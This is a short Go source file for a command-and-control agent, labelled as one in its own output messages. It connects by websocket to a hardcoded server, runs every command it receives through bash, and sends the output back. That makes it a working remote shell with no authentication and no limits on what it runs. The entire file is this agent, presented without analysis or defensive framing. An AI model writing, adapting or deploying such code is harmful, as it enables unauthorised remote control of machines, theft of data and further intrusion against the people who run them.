package main

import (
	"bytes"
	"fmt"
	"os/exec"

	"github.com/gorilla/websocket"
)

const serverURL = "ws://192.168.86.35:8080/agent"

func main() {
	fmt.Println("[+] Connecting to C2 server...")
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		fmt.Println("[-] Failed to connect to C2 server:", err)
		return
	}
	defer conn.Close()

	fmt.Println("[+] Connected to C2 server. Waiting for commands...")
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			fmt.Println("[-] Connection to server lost.")
			break
		}

		command := string(message)
		fmt.Println("[+] Received command:", command)

		// Execute the command
		output, err := executeCommand(command)
		if err != nil {
			output = fmt.Sprintf("Error: %s", err.Error())
		}

		// Send the output back to the server
		err = conn.WriteMessage(websocket.TextMessage, []byte(output))
		if err != nil {
			fmt.Println("[-] Failed to send command output.")
			break
		}
	}
}

// Executes shell commands and returns the output
func executeCommand(cmd string) (string, error) {
	var stdout, stderr bytes.Buffer
	command := exec.Command("bash", "-c", cmd)
	command.Stdout = &stdout
	command.Stderr = &stderr

	err := command.Run()
	output := stdout.String() + stderr.String()
	return output, err
}
